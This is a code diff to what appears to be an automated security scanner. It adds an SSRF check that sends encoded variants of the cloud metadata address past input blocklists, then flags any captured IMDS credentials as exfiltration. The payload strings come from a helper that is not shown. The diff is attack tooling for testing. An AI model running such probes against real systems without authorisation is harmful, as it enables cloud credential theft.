@@ -5559,6 +5559,37 @@ class ToolRegistry:
                                 pass
                         confirmed = True
                         break
+                # 1b) BLOCKLIST BYPASS — the same metadata service reached through an encoding a naive
+                # string-match misses. Without this the scan probed only the literal 169.254.169.254, so a
+                # target that blocklists that string while still fetching what it is given read as clean.
+                # A false-negative class, and the encodings were already written but never fired here.
+                if not confirmed:
+                    for payload, cloud in ssrf.metadata_bypass_payloads():
+                        r = await probe(c, p, payload, timeout=12)
+                        if not r or r["error"]:
+                            continue
+                        hit = ssrf.analyze_reflection(r["body"], payload)
+                        if not hit:
+                            continue
+                        f = ssrf.reflection_finding(url, p, payload, hit["cloud"], hit["matched"],
+                                                    credentials=bool(hit.get("credentials")))
+                        # The bypass is the more severe fact: a control was present and was defeated.
+                        f["title"] = f.get("title", "SSRF") + " (blocklist bypassed via encoded address)"
+                        f["description"] = (str(f.get("description", "")) + " The literal metadata address "
+                                            "did not succeed, but the same service was reached through an "
+                                            "encoded form of it — an input filter is present and is being "
+                                            "bypassed rather than absent.")
+                        findings.append(self._attach_poc(f, r["target"], r))
+                        evidence_targets.append(r["target"])
+                        if hit.get("credentials"):
+                            try:
+                                self.state.add_capability("cloud_credentials_captured",
+                                                          "SSRF (encoded) -> %s IMDS credential exfiltration"
+                                                          % hit["cloud"])
+                            except Exception:
+                                pass
+                        confirmed = True
+                        break
                 if confirmed:
                     continue
                 # 2) blind SSRF — internal open-vs-closed port oracle
